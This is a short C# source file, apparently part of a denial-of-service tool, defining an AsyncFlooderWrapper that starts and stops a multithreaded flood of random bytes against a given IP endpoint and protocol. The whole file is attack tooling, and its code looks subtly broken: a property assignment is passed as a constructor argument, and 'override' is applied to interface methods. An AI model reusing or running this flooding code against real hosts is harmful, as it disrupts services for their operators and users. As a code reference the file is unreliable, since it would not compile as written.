using System;
using System.Net;
using System.Net.Sockets;
using GAS.Core.AttackInformation;

namespace GAS.Core.Attacks {
    public class AsyncFlooderWrapper:IAttacker {
        private AsyncFlooder _flooder;
        private static Lazy<FastRandom.FastRandom> _rng = new Lazy<FastRandom.FastRandom>();  
        public AsyncFlooderWrapper(IPEndPoint target, ProtocolType protocol, int threadCount) {
            _flooder = new AsyncFlooder(
                new AttackInfo() {
                    Target = target,
                    Protocol = protocol,
                    Randomizer = (a) => {
                        _rng.Value.NextBytes( a );
                        return a.Length;
                    }
                },
                ThreadCount = threadCount
            );
        }

        public override void Start() {
            _flooder.Start();
        }

        public override void Stop() {
            _flooder.Stop();
        }
    }
}
